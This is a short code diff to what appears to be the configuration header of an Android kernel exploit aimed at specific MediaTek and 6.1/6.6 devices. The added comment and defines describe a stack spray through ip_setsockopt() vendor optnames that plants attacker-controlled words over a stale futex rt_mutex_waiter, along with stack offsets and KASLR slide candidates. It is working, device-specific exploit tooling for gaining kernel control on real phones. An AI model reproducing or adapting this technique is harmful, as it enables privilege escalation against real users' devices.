@@ -66,6 +66,24 @@
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db1a0ULL 
 #define SLIDE_PSELECT_WORD_SHIFT 3
 
+/*
+ * a15x is android13-5.15 MTK.  Its monolithic do_futex (0x140 frame) pushes
+ * the stale on-stack rt_mutex_waiter (T-0x4b8, verified from the panic dump)
+ * 0xb8 below the pselect6 stack_fds copy (T-0x3f0), so no SLIDE_PSELECT_WORD_SHIFT
+ * can reach it - the fd_set words never land on the waiter and the PI chain walk
+ * rb_erases garbage.  The 6.1/6.6 targets (e2s/essi/a36xq/psq) are shallow enough
+ * for the pselect route; this 5.15 target sprays through ip_setsockopt() instead:
+ * optname 43/44/46/47 zeroes a 0x108-byte stack buffer at T-0x4f8 and copies it
+ * from user with no capability check, putting the waiter words exactly on the
+ * stale waiter at buffer+0x40.  The handler then fails validation (buffer[0x20]
+ * != 2 -> EINVAL) and returns; the planted words persist on the popped stack.
+ */
+#define SLIDE_USE_SETSO_SPRAY 1
+#define SLIDE_SETSO_SPRAY_LEVEL 0          /* SOL_IP */
+#define SLIDE_SETSO_SPRAY_OPTNAME 43       /* MTK vendor optname, 0x108-byte copy */
+#define SLIDE_SETSO_SPRAY_COPY_LEN 0x108
+#define SLIDE_SETSO_SPRAY_WAITER_OFF 0x40  /* waiter tree_entry offset in the buffer */
+
 #define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
